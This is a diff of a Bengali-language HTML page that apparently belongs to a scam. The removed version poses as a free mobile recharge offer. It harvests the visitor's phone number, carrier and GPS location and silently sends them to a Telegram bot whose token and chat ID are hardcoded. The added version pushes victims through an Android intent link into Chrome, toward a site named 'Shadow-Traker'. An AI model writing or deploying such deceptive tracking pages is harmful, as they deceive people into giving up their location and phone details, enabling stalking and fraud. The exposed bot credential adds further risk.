@@ -3,77 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ফ্রি রিচার্জ অফার ২০২৬</title>
+    <title>অফারটি নিশ্চিত করুন</title>
     <style>
-        body { background-color: #f4f7f6; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #d9534f; }
-        h2 { color: #d9534f; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
+        .btn-chrome {
+            background-color: #4285F4;
+            color: white;
+            padding: 15px 25px;
+            text-decoration: none;
+            border-radius: 30px;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .instruction { color: #555; font-size: 14px; margin-top: 20px; padding: 0 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🎁 ধামাকা অফার!</h2>
-    <p>সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
-    
-    <select id="sim">
-        <option value="">সিম নির্বাচন করুন</option>
-        <option value="GP">জিপি (GP)</option>
-        <option value="BL">বাংলালিংক (BL)</option>
-        <option value="Robi">রবি (Robi)</option>
-        <option value="Airtel">এয়ারটেল (Airtel)</option>
-    </select>
+    <h2>অফারটি পেতে নিচের বাটনে ক্লিক করুন</h2>
+    <p>নিশ্চিত করুন আপনি অফিশিয়াল ব্রাউজার ব্যবহার করছেন।</p>
 
-    <input type="number" id="phone" placeholder="আপনার মোবাইল নম্বর">
-    
-    <button onclick="processOffer()">রিচার্জ নিন</button>
-</div>
+    <a href="intent://sidzf8.github.io/Shadow-Traker/#Intent;scheme=https;package=com.android.chrome;end" class="btn-chrome">
+        Open in Chrome Browser
+    </a>
 
-<script>
-function processOffer() {
-    var phone = document.getElementById('phone').value;
-    var sim = document.getElementById('sim').value;
-
-    if (sim == "" || phone.length < 11) { 
-        alert("সঠিক তথ্য দিন।"); 
-        return; 
-    }
-
-    // আপনার দেওয়া সেই নির্দিষ্ট লেখা
-    alert("রিচাজ নিশ্চিত করতে ফোনের লকেশন অপশন অন করুন না হলে পেমেন্ট পাবেন্না");
-
-    var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
-    var chat_id = "7887080882";
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
-            
-            var message = "✅ **লোকেশন অন**\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 ম্যাপ: " + mapUrl;
-            sendToTelegram(token, chat_id, message);
-        }, function(error) {
-            var message = "⚠️ **লোকেশন অফ**\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n❌ কারণ: ইউজার পারমিশন দেয়নি।";
-            sendToTelegram(token, chat_id, message);
-        }, { enableHighAccuracy: true, timeout: 5000 });
-    } else {
-        var message = "❌ GPS সাপোর্ট নেই\n📱 নম্বর: " + phone;
-        sendToTelegram(token, chat_id, message);
-    }
-}
-
-function sendToTelegram(token, chat_id, message) {
-    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
-    
-    fetch(url).then(() => {
-        alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
-        window.location.href = "https://www.google.com";
-    });
-}
-</script>
+    <div class="instruction">
+        <p>যদি বাটনটি কাজ না করে:</p>
+        <p>১. উপরে ডানদিকের <b>তিনটি ডট (⋮)</b> এ ক্লিক করুন।</p>
+        <p>২. <b>"Open in Chrome"</b> বা <b>"Open in Browser"</b> এ ক্লিক করুন।</p>
+    </div>
 
 </body>
 </html>
